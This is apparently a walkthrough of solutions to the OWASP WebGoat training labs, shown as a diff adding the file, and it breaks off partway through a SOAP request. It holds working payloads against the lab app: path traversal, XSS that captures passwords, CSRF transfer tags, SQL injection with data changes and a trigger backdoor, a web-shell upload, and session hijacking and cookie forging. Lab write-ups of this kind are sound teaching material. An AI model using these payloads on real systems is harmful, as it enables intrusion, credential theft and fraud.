@@ -1,0 +1,1134 @@
+(I) General
+
+HTTP Basics
+
+Challenge:
+Enter your name in the input field below and press "go" to submit. The server will accept the request, reverse the input, and display it back to the user, illustrating the basics of handling an HTTP request.
+
+The user should become familiar with the features of WebGoat by manipulating the above buttons to view hints, show the HTTP request parameters, the HTTP request cookies, and the Java source code. You may also try using WebScarab for the first time.
+
+Solution:
+1) Click 'Lesson Plan', 'Show Params', 'Show Cookies' 
+2) Enter a random name
+
+
+HTTP Splitting
+
+Techniques involved: HTTP Splitting, Cache Poisoning
+
+Challenge: 
+This lesson has two stages. Stage 1 teaches you how to do HTTP Splitting attacks while stage 2 builds on that to teach you how to elevate HTTP Splitting to Cache Poisoning.
+
+Enter a language for the system to search by. You will notice that the application is redirecting your request to another resource on the server. You should be able to use the CR (%0d) and LF (%0a) characters to exploit the attack. Your goal should be to force the server to send a 200 OK. If the screen changed as an effect to your attack, just go back to the homepage. After stage 2 is exploited successfully, you will find the green check in the left menu.
+
+You may find the PHP Charset Encoder useful. The Encode and DecodeURIComponent buttons translate CR and LF.
+
+Solution:
+1) Click 'Lesson Plan'
+2) Open Burp Proxy with Intercept On
+'''
+We want to input:
+en 
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 22
+Last-Modified: Fri, 30 Dec 2025 17:32:47 GMT
+<html>Potatoes.</html>
+'''
+3) Browse to: http://yehg.net/encoding/
+4) Paste the above -> encodeURIComponent
+5) In the search box: en%20%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2022%0ALast-Modified%3A%20Fri%2C%2030%20Dec%202025%2017%3A32%3A47%20GMT%0A%3Chtml%3EPotatoes.%3C%2Fhtml%3E
+6) Click 'Search' -> Refresh
+
+
+(II) Access Control Flaws
+
+Using an Access Control Matrix
+
+Challenge:
+In a role-based access control scheme, a role represents a set of access permissions and privileges. A user can be assigned one or more roles. A role-based access control scheme normally consists of two parts: role permission management and role assignment. A broken role-based access control scheme might allow a user to perform accesses that are not allowed by his/her assigned roles, or somehow allow privilege escalation to an unauthorized role.
+
+General Goal(s):
+Each user is a member of a role that is allowed to access only certain resources. Your goal is to explore the access control rules that govern this site. Only the [Admin] group should have access to the 'Account Manager' resource.
+
+Solution:
+1) Changer user: larry -> Select resource: Account Manager -> Check Access
+
+
+Bypass a Path Based Access Control Scheme
+
+Challenge:
+The 'root' user has access to all the files in the lesson_plans/English directory. Try to break the access control mechanism and access a resource that is not in the listed directory. After selecting a file to view, WebGoat will report if access to the file was granted. An interesting file to try and obtain might be a file like tomcat/conf/tomcat-users.xml. Remember that file paths will be different if using the WebGoat source.
+
+Solution:
+Start Burp Proxy with Intercept On
+Click on 'View File'
+File=/../../../../../../../etc/tomcat6/tomcat-users.xml&SUBMIT=View+File
+
+
+LAB: Role Based Access Control
+
+Stage 1: Bypass Business Layer Access Control
+As regular employee 'Tom', exploit weak access control to use the Delete function from the Staff List page. Verify that Tom's profile can be deleted. The passwords for users are their given names in lowercase (e.g. the password for Tom Cat is "tom").
+
+Solution:
+Select Tom Cat
+pass: tom
+Open Burp Proxy with Intercept On
+Click on SearchStaff
+action=DeleteProfile
+
+Stage 2: #Only the Developer version
+
+Stage 3: Breaking Data Layer Access Control
+As regular employee 'Tom', exploit weak access control to View another employee's profile. Verify the access.
+
+Solution:
+Select Tom Cat
+pass: tom
+Open Burp Proxy with Intercept On
+Click on ViewProfile
+employee_id=111
+
+Stage 4: #Only the Developer version
+
+
+Remote Admin Access
+
+Challenge:
+Try to access the administrative interface for WebGoat. You may also try to access the administrative interface for Tomcat. The Tomcat admin interface can be accessed via a URL (/admin) and will not count towards the completion of this lesson. 
+
+Solution:
+In the left hand menu -> Admin Functions
+Add: &admin=true to all the links under 'Admin Functions'
+
+
+(III) AJAX Security
+
+Same Origin Policy Protection
+
+Challenge:
+This exercise demonstrates the Same Origin Policy Protection. XHR requests can only be passed back to the originating server. Attempts to pass data to a non-originating server will fail.
+
+Solution:
+Click on the Same Origin request
+Click on the Different Origin request
+
+
+LAB: DOM-Based cross-site scripting
+
+Challenge: 
+
+STAGE 1: For this exercise, your mission is to deface this website using the image at the following location: OWASP IMAGE
+
+Solution:
+Copy the image link location
+Input: <img src="http://192.168.189.146/webgoat/images/logos/owasp.jpg"></img>
+
+STAGE 2: Now, try to create a JavaScript alert using the image tag
+
+Solution:
+Input: <img src=b onerror=alert('wut?')></img>
+
+STAGE 3: Next, try to create a JavaScript alert using the IFRAME tag.
+
+Solution:
+Input: <iframe src=javascript:alert('wut?')></iframe>
+
+STAGE 4: Use the following to create a fake login form:
+
+Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
+
+Solution:
+<script>Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR></script>
+
+STAGE 5: # Developer exercise
+
+
+LAB: Client Side Filtering
+
+Challenge:
+
+STAGE 1: You are Moe Stooge, CSO of Goat Hills Financial. You have access to everyone in the company's information, except the CEO, Neville Bartholomew. Or at least you shouldn't have access to the CEO's information. For this exercise, examine the contents of the page to see what extra information you can find.
+
+Solution:
+Open Burp Proxy with Intercept On
+Refresh the page -> Forward
+userId=100 -> Right-click -> Do Intercept -> Response to this request -> Forward
+Copy the salary: 450000 -> Submit
+
+STAGE 2: # Developer exercise
+
+
+DOM Injection
+
+Challenge:
+* Your victim is a system that takes an activation key to allow you to use it.
+* Your goal should be to try to get to enable the activate button.
+* Take some time to see the HTML source in order to understand how the key validation process works.
+
+Solution:
+Right-click -> View Page Source
+Right-click the Activate button -> Inspect element
+Change from disabled to enabled
+Click on the button
+
+
+XML Injection
+
+Challenge:
+WebGoat-Miles Reward Miles shows all the rewards available. Once you've entered your account ID, the lesson will show you your balance and the products you can afford. Your goal is to try to add more rewards to your allowed set of rewards. Your account ID is 836239. 
+
+Solution:
+Start Burp Proxy with Intercept On
+Enter your ID
+Check all the entries -> Submit
+Add: &check1004=on&check1004=on
+Forward
+
+
+JSON Injection
+
+Challenge:
+* You are traveling from Boston, MA- Airport code BOS to Seattle, WA - Airport code SEA.
+* Once you enter the three digit code of the airport, an AJAX request will be executed asking for the ticket price.
+* You will notice that there are two flights available, an expensive one with no stops and another cheaper one with 2 stops.
+* Your goal is to try to get the one with no stops but for a cheaper price. 
+
+Solution:
+Start Burp Proxy with Intercept On
+From: BOS
+To: SEA
+Select the non-stop flight
+Submit
+price2Submit=%24000
+Forward
+
+
+Silent Transactions Attacks
+
+Challenge:
+* This is a sample internet banking application - money transfer page.
+* It shows below your balance, the account you are transferring to and amount you will transfer.
+* The application uses AJAX to submit the transaction after doing some basic client side validations.
+* Your goal is to try to bypass the user's authorization and silently execute the transaction.
+
+Solution:
+Right-click -> Inspect Element -> Console
+javascript: submitData(1111,10000000000)
+Enter
+# We performed a silent transaction, 
+# which doesn't require user interaction and instead gets executed behind the scenes
+
+
+Dangerous Use of Eval
+
+Challenge:
+For this exercise, your mission is to come up with some input containing a script. You have to try to get this page to reflect that input back to your browser, which will execute the script. In order to pass this lesson, you must 'alert()' document.cookie.
+
+Solution:
+Start Burp Proxy with Intercept On
+Click on 'Update'
+Right-click -> Do intercept -> Response to this request
+Browse to: http://yehg.net/encoding/
+EncodeURIComponent: 123'):alert(document.cookie):('
+# Output: 123')%3Balert(document.cookie)%3B('
+Enter your three digit access code: 123')%3Balert(document.cookie)%3B('
+
+
+Insecure Client Storage
+
+STAGE 1: For this exercise, your mission is to discover a coupon code to receive an unintended discount.
+
+Solution:
+Right-click -> View Page Source Code
+Right-click 'javascript/clientSideValidation.js' -> Open Link in New Tab
+Note the encrypted coupons and the 'decrypt' function
+Right-click -> Inspect Element -> Console
+Enter: javascript:alert(decrypt('faopsc'));
+# Output = BRONZE
+
+STAGE 2: Now, try to get your entire order for free.
+
+Solution:
+Start Burp Proxy with Intercept On
+Change all the quantities to: 100
+Click on 'Purchase'
+GRANDTOT=%240%2C0.00
+Forward
+
+
+(IV) Authentication Flaws
+
+Password Strength
+
+Challenge:
+The Accounts of your Webapplication are only as save as the passwords. For this exercise, your job is to test several passwords on https://www.cnlab.ch/codecheck. You must test all 5 passwords at the same time...
+On your applications you should set good password requirements! 
+
+Solution:
+Test each password in a new tab -> Submit the results
+
+
+Forgot Password
+
+Challenge:
+Users can retrieve their password if they can answer the secret question properly. There is no lock-out mechanism on this 'Forgot Password' page. Your username is 'webgoat' and your favorite color is 'red'. The goal is to retrieve the password of another user. 
+
+
+Solution:
+Input: admin
+# Keep trying until you get it right
+Input: green
+
+
+Basic Authentication
+
+Challenge:
+For this lesson, your goal is to understand Basic Authentication and answer the questions below. 
+
+Solution:
+What is the name of the authentication header: Authorization
+What is the decoded value of the authentication header: guest:guest
+
+Challenge: 
+* Congratulations, you have figured out the mechanics of basic authentication.  - Now you must try to make WebGoat reauthenticate you as:     - username: basic     - password: basic. Use the Basic Authentication Menu to start at login page.
+
+Solution:
+On your host's browser, browse to: http://192.168.189.146/WebGoat/attack?Screen=35&menu=500
+Login as basic:basic
+
+
+Multi Level Login 1
+
+Challenge:
+
+STAGE 1: This stage is just to show how a classic multi login works. Your goal is to do a regular login as Jane with password tarzan. You have following TANs:
+Tan #1 = 15648
+Tan #2 = 92156
+Tan #3 = 4879
+Tan #4 = 9458
+Tan #5 = 4879
+
+Solution:
+Follow the instructions
+
+STAGE 2: Now you are a hacker who already has stolen some information from Jane by a phishing mail. You have the password which is tarzan and the Tan #1 which is 15648
+The problem is that the first tan is already used... try to break into the system anyway. 
+
+Solution:
+Logout
+name: Jane
+pass: tarzan
+tan: 15648
+Open Burp Proxy with Intercept On
+submit
+hidden_tan=1
+Forward
+
+
+Multi Level Login 2
+
+Challenge: 
+You are an attacker called Joe. You have a valid account by webgoat financial. Your goal is to log in as Jane. Your username is Joe and your password is banana. This are your TANS:
+Tan #1 = 15161
+Tan #2 = 4894
+Tan #3 = 18794
+Tan #4 = 1564
+Tan #5 = 45751
+
+
+Solution:
+user: Joe
+pass: banana
+tan: 4894
+Open Burp Proxy with Intercept On
+submit
+hidden_user=Jane
+Forward
+
+
+(V) Buffer Overflows
+
+Off-by-One Overflows
+
+Challenge: 
+
+
+Welcome to the OWASP Hotel! Can you find out which room a VIP guest is staying in?
+In order to access the Internet, you need to provide us the following information:
+
+Step 1/2
+
+Ensure that your first and last names are entered exactly as they appear in the hotel's registration system.
+
+Solution:
+First Name: Coconut
+Last Name: Cookies
+Room Number: <output of 'A' * 10000>
+Submit
+Open Burp Proxy with Intercept On
+Accept Terms
+Right-click -> Do intercept -> Response to this request
+Forward
+Notice the VIP data: Johnathan:Ravern:4321
+Forward
+
+
+(VI) Code Quality
+
+Discover Clues in the HTML
+
+Challenge: 
+Developers are notorious for leaving statements like FIXME's, TODO's, Code Broken, Hack, etc... inside the source code.  Review the source code for any comments denoting  passwords, backdoors, or something doesn't work right.  Below is an example of a forms based authentication form. Look for clues to help you log in. 
+
+Solution:
+Right-click -> View Page Source Code
+# Note the: <!-- FIXME admin:adminpw  --><!-- Use Admin to regenerate database  -->
+user: admin
+pass: adminpw
+
+
+(VII) Concurrency
+
+Thread Safety Problems
+
+Challenge:
+The user should be able to exploit the concurrency error in this web application and view login information for another user that is attempting the same function at the same time. This will require the use of two browsers. Valid user names are 'jeff' and 'dave'.
+
+Solution:
+Open the page in another tab
+In one tab enter 'Dave', in the other 'Jeff' -> Submit
+
+
+Shopping Cart Concurrency Flaw
+
+Challenge:
+For this exercise, your mission is to exploit the concurrency issue which will allow you to purchase merchandise for a lower price.
+
+Solution:
+Open the page in another tab
+In one tab, enter 1, 2, 3, 4 for each item respectively
+Click Purchase
+In the other tab, enter 10, 20, 30, 40 for each time respectively
+Click Update Cart
+On the first tab click Confirm
+
+
+(VIII) Cross-Site Scripting (XSS)
+
+Phishing with XSS
+
+Challenge:
+This lesson is an example of how a website might support a phishing attack
+
+Below is an example of a standard search feature.
+Using XSS and HTML insertion, your goal is to:
+
+    Insert html to that requests credentials
+    Add javascript to actually collect the credentials
+    Post the credentials to http://localhost/WebGoat/catcher?PROPERTY=yes &user=catchedUserName&password=catchedPasswordName
+
+To pass this lesson, the credentials must be posted to the catcher servlet.
+
+Solution:
+# See xss_phishing.html
+Search: 
+<h1>Free stock tips</h1>
+<p>This feature requires account login:</p>
+<br><br>
+Enter username: <br><input type="text" name="username"><br>
+Enter password: <br><input type="password" name="password"><br>
+<input type="submit" value="Login" onclick="var xssImg=new Image();xssImg.src='http://192.168.189.146/WebGoat/catcher?PROPERTY=yes&user='+this.form.username.value+'&password='+this.form.password.value;">
+Search
+user: ok
+pass: ok
+Login
+
+
+LAB: Cross Site Scripting
+
+Stage 1
+Stage 1: Execute a Stored Cross Site Scripting (XSS) attack.
+As 'Tom', execute a Stored XSS attack against the Street field on the Edit Profile page. Verify that 'Jerry' is affected by the attack.
+The passwords for the accounts are the lower-case versions of their given names (e.g. the password for Tom Cat is "tom").
+
+Solution: 
+Log in as Tom
+View Profile
+Edit Profile
+Add to Street: <script>alert('XSS, baby!')</script>
+Update Profile
+Log out
+Log in as Jerry
+Select 'Tom Cat (employee)' -> View Profile
+
+
+Stage 2
+# Only works in developer version
+
+
+Stage 3
+Stage 3: Execute a previously Stored Cross Site Scripting (XSS) attack.
+The 'Bruce' employee profile is pre-loaded with a stored XSS attack. Verify that 'David' is affected by the attack even though the fix from stage 2 is in place.
+
+Solution:
+Log in as David
+Select 'Bruce McGuirre (employee) -> View Profile
+
+
+Stage 4
+# Only works in developer version
+
+
+Stage 5
+Stage 5: Execute a Reflected XSS attack.
+Use a vulnerability on the Search Staff page to craft a URL containing a reflected XSS attack. Verify that another employee using the link is affected by the attack.
+
+Solution:
+Log in as Larry
+Search Staff
+Input: <script>alert('XSS, baby!')</script>
+Find Profile
+
+
+Stage 6
+# Only works in developer version
+
+
+Stored XSS Attacks
+
+Challenge:
+It is always a good practice to scrub all input, especially those inputs that will later be used as parameters to OS commands, scripts, and database queries. It is particularly important for content that will be permanently stored somewhere in the application. Users should not be able to create message content that could cause another user to load an undesireable page or undesireable content when the user's message is retrieved. 
+
+Solution:
+Title: Ok
+Message: Ok <script>alert('XSS, baby!')</script>
+Click on the 'Ok' under Message List
+
+
+Reflected XSS Attacks
+
+Challenge:
+It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it. 
+
+Solution:
+In the access code box, after the digits: <script>alert('XSS, baby!')</script>
+Purchase
+
+
+Cross Site Request Forgery (CSRF)
+
+Challenge:
+Your goal is to send an email to a newsgroup that contains an image whose URL is pointing to a malicious request. Try to include a 1x1 pixel image that includes a URL. The URL should point to the CSRF lesson with an extra parameter "transferFunds=4000". You can copy the shortcut from the left hand menu by right clicking on the left hand menu and choosing copy shortcut. Whoever receives this email and happens to be authenticated at that time will have his funds transferred. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
+Note that the "Screen" and "menu" GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.
+
+Solution:
+Right-click 'CSRF' on the left-hand menu -> Copy Link Location
+Title: Ok
+Message: Check this out: <img src="http://192.168.189.146/WebGoat/attack?Screen=128&menu=900&transferFunds=4000"/>
+Submit
+Click on 'Ok' under Message List
+Refresh page
+
+
+CSRF Prompt By-Pass
+
+Challenge:
+Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains multiple malicious requests: the first to transfer funds, and the second a request to confirm the prompt that the first request triggered. The URL should point to the CSRF lesson with an extra parameter "transferFunds=4000", and "transferFunds=CONFIRM". You can copy the shortcut from the left hand menu by right clicking on the left hand menu and choosing copy shortcut. Whoever receives this email and happens to be authenticated at that time will have his funds transferred. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
+Note that the "Screen" and "menu" GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.
+
+Solution:
+Right-click 'CSRF' on the left-hand menu -> Copy Link Location
+Title: Ok
+Message: 
+Check this out: <img src="http://192.168.189.146/WebGoat/attack?Screen=121&menu=900&transferFunds=4000"/>
+<img src="http://192.168.189.146/WebGoat/attack?Screen=121&menu=900&transferFunds=CONFIRM"/>
+Submit
+Click on 'Ok' under Message List
+Refresh page
+
+
+CSRF Token By-Pass
+
+Challenge:
+Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains a malicious request to transfer funds. To successfully complete you need to obtain a valid request token. The page that presents the transfer funds form contains a valid request token. The URL for the transfer funds page is the same as this lesson with an extra parameter "transferFunds=main". Load this page, read the token and append the token in a forged request to transferFunds. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
+Note that the "Screen" and "menu" GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.
+
+Solution:
+Add to the URL: &transferFunds=main
+Go
+Input: 9999999
+Submit Query
+
+
+HTTPOnly Test
+
+Challenge:
+The purpose of this lesson is to test whether your browser supports the HTTPOnly cookie flag. Note the value of the unique2u cookie. If your browser supports HTTPOnly, and you enable it for a cookie, client side code should NOT be able to read OR write to that cookie, but the browser can still send its value to the server. Some browsers only prevent client side read access, but don't prevent write access.
+
+With the HTTPOnly attribute turned on, type "javascript:alert(document.cookie)" in the browser address bar. Notice all cookies are displayed except the unique2u cookie. 
+
+Solution:
+Follow the instructions.
+
+
+Cross Site Tracing (XST) Attacks
+
+Challenge:
+Tomcat is configured to support the HTTP TRACE command. Your goal is to perform a Cross Site Tracing (XST) attack. 
+
+Solution:
+# XST attacks are a way to bypass HTTP-Only protection - enabling the viewing of otherwise blocked HTTP headers, cookies, etc.
+
+Access code: <script>var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'http://192.168.189.146/WebGoat/attack', false); xhr.send(null); if(200 == xhr.status) alert(xhr.responseText);</script>
+Purchase
+
+
+(IX) Improper Error Handling
+
+Fail Open Authentication Scheme
+
+Challenge:
+Due to an error handling problem in the authentication mechanism, it is possible to authenticate as the 'webgoat' user without entering a password. Try to login as the webgoat user without specifying a password.
+
+Solution:
+Open Burp Proxy with Intercept On
+User Name: webgoat
+Login
+Delete the password entry in Burp
+Forward
+
+
+(X) Injection Flaws
+
+Numeric SQL Injection
+
+Challenge:
+The form below allows a user to view weather data. Try to inject an SQL string that results in all the weather data being displayed. 
+
+Solution:
+Open Burp Proxy with Intercept On
+Go!
+station=101 or 1=1
+Forward
+
+
+Log Spoofing
+
+Challenge:
+* The grey area below represents what is going to be logged in the web server's log file.
+* Your goal is to make it like a username "admin" has succeeded into logging in.
+* Elevate your attack by adding a script to the log file. 
+
+Solution:
+Browse to: http://yehg.net/encoding/
+peanuts
+Login succeeded for username: admin
+encodeURIComponent
+Username: peanuts%0ALogin%20succeeded%20for%20username%3A%20admin
+Login
+
+
+XPATH Injection
+
+Challenge:
+The form below allows employees to see all their personal data including their salaries. Your account is Mike/test123. Your goal is to try to see other employees data as well. 
+
+Solution:
+User Name: ' or '1'='1
+Password: ' or '1'='1
+Submit
+
+
+String SQL Injection
+
+Challenge:
+The form below allows a user to view their credit card numbers. Try to inject an SQL string that results in all the credit card numbers being displayed. Try the user name of 'Smith'. 
+
+Solution:
+Input: Smith' or '1'='1'-- 
+
+
+LAB: SQL Injection
+
+Stage 1
+Stage 1: Use String SQL Injection to bypass authentication. Use SQL injection to log in as the boss ('Neville') without using the correct password. Verify that Neville's profile can be viewed and that all functions are available (including Search, Create, and Delete).
+
+Solution:
+Select 'Neville' from the dropdown menu
+Open Burp Proxy with Intercept On
+Login
+password=' or '1'='1
+Forward
+
+
+Stage 2
+# Only works in developer version
+
+
+Stage 3
+Stage 3: Execute SQL Injection to bypass authorization.
+As regular employee 'Larry', use SQL injection into a parameter of the View function (from the List Staff page) to view the profile of the boss ('Neville').
+
+Solution:
+password: larry
+Login
+Open Burp Proxy with Intercept On
+ViewProfile
+employee_id=101 or 1=1 order by employee_id desc
+
+
+Stage 4
+# Only works in developer version
+
+
+Modify Data with SQL Injection
+
+Challenge:
+The form below allows a user to view salaries associated with a userid (from the table named salaries). This form is vulnerable to String SQL Injection. In order to pass this lesson, use SQL Injection to modify the salary for userid jsmith.
+
+Solution:
+Input: jsmith';update salaries set salary=1000000 where userid='jsmith
+
+
+Add Data with SQL Injection
+
+Challenge:
+The form below allows a user to view salaries associated with a userid (from the table named salaries). This form is vulnerable to String SQL Injection. In order to pass this lesson, use SQL Injection to add a record to the table.
+
+Solution:
+Input: jsmith';insert into salaries values ('cake', 10);--
+
+
+Database Backdoors
+
+Stage 1: Use String SQL Injection to execute more than one SQL Statement. The first stage of this lesson is to teach you how to use a vulnerable field to create two SQL statements. The first is the system's while the second is totally yours. Your account ID is 101. This page allows you to see your password, ssn and salary. Try to inject another update to update salary to something higher
+
+Solution:
+Input: 101
+101; update employee set salary = 1000000000 where userid = 101
+
+
+Stage 2: Use String SQL Injection to inject a backdoor. The second stage of this lesson is to teach you how to use a vulneable fields to inject the DB work or the backdoor. Now try to use the same technique to inject a trigger that would act as SQL backdoor, the syntax of a trigger is:
+CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = NEW.userid
+Note that nothing will actually be executed because the current underlying DB doesn't support triggers.
+
+Solution:
+Input: 101; CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = NEW.userid
+
+
+(XI) Denial of Service
+
+Challenge:
+This site allows a user to login multiple times. This site has a database connection pool that allows 2 connections. You must obtain a list of valid users and create a total of 3 logins. 
+
+Solution: 
+User Name: ' or '1'='1
+Password: ' or '1'='1
+Open three tabs in your browser
+Enter the credentials of three users simultaneously
+
+
+(XII) Insecure Communication
+
+Stage1: In this stage you have to sniff the password. And answer the question after the login.
+
+Solution:
+Open Wireshark and chose the appropriate connection
+Apply filter: http.request.method=="POST"
+Log in
+'''
+Under HTML Form URL Encoded, note:
+clear_pass = sniffy
+'''
+Input: sniffy -> Submit
+
+
+Stage2: Now you have to change to a secure connection. The URL should start with https:// If your browser is complaining about the certificate just ignore it. Sniff again the traffic and answer the questions
+
+Solution:
+Add 'https' to the url
+Temporarily allow the exception
+Remove the filtering in Wireshark
+Log in
+Ctrl-F -> -> String -> sniffy -> Enter
+# Not found
+From the dropdown menus select 'No' and 'TLS'
+
+
+(XIII) Insecure Configuration
+
+Challenge:
+ * Your goal should be to try to guess the URL for the "config" interface.
+* The "config" URL is only available to the maintenance personnel.
+* The application doesn't check for horizontal privileges.
+Can you try to force browse to the config page which should only be accessed by maintenance personnel.
+
+Solution:
+In the Url: WebGoat/conf
+
+
+(XIV) Malicious Execution
+
+Challenge:
+In order to pass this lesson, upload and run a malicious file. In order to prove that your file can execute, it should create another file named:
+
+/var/lib/tomcat6/webapps/WebGoat/mfe_target/root.txt
+
+Once you have created this file, you will pass the lesson.
+
+Solution:
+Upload FuzzDB's cmd.jsp
+Open a new tab
+Browse to: /WebGoat/uploads/cmd.jsp
+touch /var/lib/tomcat6/webapps/WebGoat/mfe_target/root.txt
+Refresh the challenge page
+
+
+(XV) Parameter Tampering
+
+Bypass HTML Field Restrictions
+
+Challenge:
+The form below uses HTML form field restrictions. In order to pass this lesson, submit the form with each field containing an unallowed value. You must submit invalid values for all six fields in one form submission.
+
+Solution:
+Open Burp Proxy with Intercept On
+Submit
+select=pepper&radio=corn&checkbox=off&shortinput=1111111111111111111&disabledinput=enabled&SUBMIT=popcorn
+Forward
+
+
+Exploit Hidden Fields
+
+Challenge:
+Try to purchase the HDTV for less than the purchase price, if you have not done so already. 
+
+Solution:
+Open Burp Proxy with Intercept On
+Purchase
+Price=0.01
+
+
+Exploit Unchecked Email
+
+Challenge:
+This form is an example of a customer support page. Using the form below try to:
+1) Send a malicious script to the website admin.
+2) Send a malicious script to a 'friend' from OWASP.
+
+Solution:
+<script>alert('XSS, baby!')</script>
+Send
+Open Burp Proxy with Intercept On
+Send
+to=webgoat.friend%40owasp.org
+Forward
+
+
+Bypass Client Side JavaScript Validation
+
+Challenge:
+This website performs both client and server side validation. For this exercise, your job is to break the client side validation and send the website input that it wasn't expecting. You must break all 7 validators at the same time. 
+
+Solution:
+Open Burp Proxy with Intercept On
+Submit
+field1=AAAAA&field2=BBBBB&field3=!!!!!!&field4=waffles&field5=HAHAHAHA&field6=HOHOHO!!!&field7=XAXAXAXAXA
+Forward
+
+
+(XVI) Session Management Flaws
+
+Hijack a Session
+
+Challenge:
+Try to access an authenticated session belonging to someone else. 
+
+Solution:
+Open WebScarab with the Proxy intercepting requests
+Refresh the page
+# Note the weak ID: WEAKID=17534-1481152359124 (in my case)
+WebScarab - SessionID Analysis
+Select the GET request to the attack page
+Remove the WEAKID cookie
+Test
+Samples: 50 
+Fetch
+Analysis
+Select the appropriate session
+Look in the values for the instance that skips one number
+In my case: 
+	17544-1481154113268	
+	17546-1481154113556	
+Hence our range will be: 17545-1481154113[268-556]
+Open JHijack
+Host: <appropriate address> ; Port: 80 ; Url: /WebGoat/attack?Screen=72&menu=1800 ; 
+Method: GET ; Grep: Congratulations ; SESSID: <your JSESSIONID> ; HijackType: Cookie ; HijackID: WEAKID=17545-1481154113$ ; HijackData: Numeric ; Range 268 - 556
+Hijack
+# Note the result: 17545-1481154113412 (in my case)
+Refresh the page
+WEAKID=17545-1481154113412
+Accept changes
+
+
+Spoof An Authentication Cookie
+
+Challenge:
+The user should be able to bypass the authentication check. Login using the webgoat/webgoat account to see what happens. You may also try aspect/aspect. When you understand the authentication cookie, try changing your identity to alice.
+
+Solution:
+Open Burp Proxy with Intercept On
+User name: webgoat
+Password: webgoat
+Log in
+Refresh
+# Notice the AuthCookie=65432ubphcfx
+Log out
+User name: aspect
+Password: aspect
+Log in
+Refresh
+# Notice the AuthCookie=65432udfqtb
+Log out
+Browse to: http://yehg.net/encoding/
+Paste: ubphcfx
+Encrypt -> reverse -> Encrypt -> char--
+# The result is: webgoat
+# We just have to reverse 'alice' and then encrypt it with char++
+Input: alice
+Encrypt -> reverse -> Encrypt -> char++
+# The result is: fdjmb
+User Name: webgoat
+Password: webgoat
+Log in
+Refresh
+AuthCookie=65432fdjmb
+Forward
+
+
+Session Fixation
+
+STAGE 1: You are Hacker Joe and you want to steal the session from Jane. Send a prepared email to the victim which looks like an official email from the bank. A template message is prepared below, you will need to add a Session ID (SID) in the link inside the email. Alter the link to include a SID.
+
+Solution:
+After menu, add: &SID=12345
+# If you get an error, make sure to modify the link appropriately
+Send Mail
+
+
+STAGE 2: Now you are the victim Jane who received the email below. If you point on the link with your mouse you will see that there is a SID included. Click on it to see what happens.
+
+Solution:
+Follow the instructions
+
+
+STAGE 3: The bank has asked you to verfy your data. Log in to see if your details are correct. Your user name is Jane and your password is tarzan. 
+
+Solution:
+Follow the instructions
+
+
+STAGE 4: It is time to steal the session now. Use following link to reach Goat Hills Financial.
+
+Solution:
+Click on the link
+In the URL: SID=12345
+Go
+
+
+(XVII) Web Services
+
+Create a SOAP Request
+
+Stage 1
+Try connecting to the WSDL with a browser or Web Service tool. The URL for the web service is: http://localhost/WebGoat/services/SoapRequest The WSDL can usually be viewed by adding a ?WSDL on the end of the web service request. You must access 2 of the operations to pass this lesson. 
+
+Solution:
+Browse to: http://<host>/WebGoat/services/SoapRequest?WSDL
+Input: 4
+
+
+Stage 2
+Now, what is the type of the (id) parameter in the "getFirstNameRequest" method
+
+Solution:
+Input: int
+
+
+Stage 3
+Intercept the request and invoke any method by sending a valid SOAP request for a valid account.
+
+Solution:
+Open Burp Proxy with Intercept On
+Press to generate an HTTP request
+
+POST /WebGoat/services/SoapRequest HTTP/1.1
+Host: 192.168.189.146
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.189.146/WebGoat/attack?Screen=19&menu=1900
+Cookie: JSESSIONID=C3C53BCF0F5F3EE816AD98AA970EA6D4; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic cm9vdDpvd2FzcGJ3YQ==
+Connection: close
+Content-Type: text/xml 
+Content-Length: 466
+SOAPAction:
+
+<?xml version="1.0" encoding="UTF-8"?> 
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" 
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <SOAP-ENV:Body> 
+    <ns1:getFirstName SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="http://lessons"> 
+    <id xsi:type="xsd:int">101</id> 
+    </ns1:getFirstName>
+  </SOAP-ENV:Body> 
+</SOAP-ENV:Envelope>
+
+Forward
+
+Refresh the page
+Send the request again
+
+POST /WebGoat/services/SoapRequest HTTP/1.1
+Host: 192.168.189.146
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.189.146/WebGoat/attack?Screen=19&menu=1900
